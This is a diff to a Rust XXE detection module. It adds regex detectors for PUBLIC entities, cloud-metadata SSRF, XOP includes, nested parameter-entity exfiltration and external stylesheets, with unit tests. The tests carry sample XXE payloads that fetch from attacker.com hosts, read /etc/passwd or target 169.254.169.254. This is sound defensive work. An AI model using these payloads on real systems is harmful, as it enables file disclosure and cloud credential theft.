@@ -332,6 +332,112 @@ impl L2Evaluator for XxeEvaluator {
             });
         }
 
+        // XXE via PUBLIC identifier (PUBLIC + SYSTEM identifiers)
+        static PUBLIC_ENTITY_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(
+                r#"(?is)<!ENTITY\s+\w+\s+PUBLIC\s+[\x27\x22][^'"]+[\x27\x22]\s+[\x27\x22][^'"]+[\x27\x22]"#,
+            )
+            .unwrap()
+        });
+        if let Some(m) = PUBLIC_ENTITY_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "xxe_public_entity".into(),
+                confidence: 0.93,
+                detail: "PUBLIC entity declaration references an external identifier".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "PUBLIC entity declarations reference external DTD resources via a public identifier + system identifier. This bypasses SYSTEM-only filters and triggers OOB data exfiltration via external URL resolution".into(),
+                    offset: m.start(),
+                    property: "XML parsers must disable ALL external entity resolution including PUBLIC identifier entities".into(),
+                }],
+            });
+        }
+
+        // XXE SSRF to cloud metadata services
+        static XXE_SSRF_METADATA_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?is)SYSTEM\s+[\x27\x22](?:https?://)?(?:169\.254\.169\.254|metadata\.google\.internal|169\.254\.170\.2|fd00:ec2::254|100\.100\.100\.200)").unwrap()
+        });
+        if let Some(m) = XXE_SSRF_METADATA_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "xxe_ssrf_metadata".into(),
+                confidence: 0.94,
+                detail: "SYSTEM entity targets cloud metadata endpoint".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "XXE SYSTEM entity pointing to cloud instance metadata endpoints (169.254.169.254 = AWS/GCP/Azure) performs SSRF to steal cloud credentials, IAM roles, and instance configuration".into(),
+                    offset: m.start(),
+                    property: "XML SYSTEM entities must not resolve to link-local addresses (169.254.0.0/16) or known cloud metadata endpoints".into(),
+                }],
+            });
+        }
+
+        // XOP include resolution
+        static XOP_INCLUDE_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?is)<(?:\w+:)?Include\b[^>]*\bhref\s*=\s*[\x27\x22]?(?:file://|https?://|ftp://|gopher://)").unwrap()
+        });
+        if let Some(m) = XOP_INCLUDE_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "xxe_xop_include".into(),
+                confidence: 0.91,
+                detail: "XOP Include href may load external resources".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "XOP (XML-Binary Optimized Packaging) Include directives with file:// or http:// hrefs cause XML parsers to fetch and embed external content, enabling both XXE file disclosure and SSRF in SOAP/MTOM processing contexts".into(),
+                    offset: m.start(),
+                    property: "XOP Include href attributes must not reference file:// or arbitrary external URLs. Only trusted content-id references should be permitted".into(),
+                }],
+            });
+        }
+
+        // Parameter entity nested DTD OOB exfiltration chain
+        static NESTED_DTD_OOB_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(
+                r#"(?is)<!ENTITY\s+%\s+\w+\s+SYSTEM\s+[\x27\x22][^'"]+[\x27\x22][^<]*>[^<]*%\w+;"#,
+            )
+            .unwrap()
+        });
+        if let Some(m) = NESTED_DTD_OOB_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "xxe_nested_dtd_oob".into(),
+                confidence: 0.95,
+                detail: "Nested parameter entity DTD chain for OOB exfiltration".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "Nested parameter entity OOB exfiltration: attacker loads a remote DTD that defines a new entity containing the stolen file data, then triggers a DNS/HTTP request to attacker infrastructure encoding the exfiltrated content".into(),
+                    offset: m.start(),
+                    property: "Parameter entities must be fully disabled. External DTD loading via %entity; SYSTEM references must be blocked at the parser level".into(),
+                }],
+            });
+        }
+
+        // xml-stylesheet processing instruction external stylesheet loading
+        static XSLT_PI_RE: std::sync::LazyLock<Regex> = std::sync::LazyLock::new(|| {
+            Regex::new(r"(?i)<\?xml-stylesheet[^?>]*href\s*=\s*[\x27\x22]?(?:file://|https?://|//[^/])").unwrap()
+        });
+        if let Some(m) = XSLT_PI_RE.find(&decoded) {
+            dets.push(L2Detection {
+                detection_type: "xxe_xslt_pi".into(),
+                confidence: 0.88,
+                detail: "xml-stylesheet PI references external stylesheet URL".into(),
+                position: m.start(),
+                evidence: vec![ProofEvidence {
+                    operation: EvidenceOperation::PayloadInject,
+                    matched_input: m.as_str().to_owned(),
+                    interpretation: "xml-stylesheet processing instructions can trigger external XSLT stylesheet loading and execution. Malicious XSLT can read files, perform SSRF, and execute XPath/XSLT injection attacks".into(),
+                    offset: m.start(),
+                    property: "xml-stylesheet processing instructions must not reference external URLs. XSLT processing must be disabled when handling untrusted XML".into(),
+                }],
+            });
+        }
+
         dets
     }
 
@@ -348,7 +454,12 @@ impl L2Evaluator for XxeEvaluator {
             | "xxe_dtdless_default_entity"
             | "xxe_soap_schema_relay"
             | "xxe_xinclude_href"
-            | "xxe_parameter_entity_abuse" => Some(InvariantClass::XxeEntityExpansion),
+            | "xxe_parameter_entity_abuse"
+            | "xxe_public_entity"
+            | "xxe_ssrf_metadata"
+            | "xxe_xop_include"
+            | "xxe_nested_dtd_oob"
+            | "xxe_xslt_pi" => Some(InvariantClass::XxeEntityExpansion),
             "xxe_xslt_injection" => Some(InvariantClass::XmlInjection),
             _ => None,
         }
@@ -496,5 +607,45 @@ xsi:noNamespaceSchemaLocation="http://attacker.tld/note.xsd">hello</note>"#;
             r#"<!DOCTYPE x [<!ENTITY err SYSTEM "file:///nonexistent-path-xxe">]><x>&err;</x>"#;
         let dets = eval.detect(input);
         assert!(dets.iter().any(|d| d.detection_type == "xxe_error_based"));
+    }
+
+    #[test]
+    fn test_xxe_public_entity() {
+        let eval = XxeEvaluator;
+        let input = r#"<!ENTITY xxe PUBLIC "x" "http://attacker.com/evil">"#;
+        let dets = eval.detect(input);
+        assert!(dets.iter().any(|d| d.detection_type == "xxe_public_entity"));
+    }
+
+    #[test]
+    fn test_xxe_ssrf_metadata() {
+        let eval = XxeEvaluator;
+        let input = r#"SYSTEM "http://169.254.169.254/latest/meta-data/""#;
+        let dets = eval.detect(input);
+        assert!(dets.iter().any(|d| d.detection_type == "xxe_ssrf_metadata"));
+    }
+
+    #[test]
+    fn test_xxe_xop_include() {
+        let eval = XxeEvaluator;
+        let input = r#"<xop:Include href="file:///etc/passwd"/>"#;
+        let dets = eval.detect(input);
+        assert!(dets.iter().any(|d| d.detection_type == "xxe_xop_include"));
+    }
+
+    #[test]
+    fn test_xxe_nested_dtd() {
+        let eval = XxeEvaluator;
+        let input = r#"<!ENTITY % dtd SYSTEM "http://attacker.com/dtd"> %dtd; %send;"#;
+        let dets = eval.detect(input);
+        assert!(dets.iter().any(|d| d.detection_type == "xxe_nested_dtd_oob"));
+    }
+
+    #[test]
+    fn test_xxe_xslt_pi() {
+        let eval = XxeEvaluator;
+        let input = r#"<?xml-stylesheet href="http://attacker.com/evil.xsl" type="text/xsl"?>"#;
+        let dets = eval.detect(input);
+        assert!(dets.iter().any(|d| d.detection_type == "xxe_xslt_pi"));
     }
 }
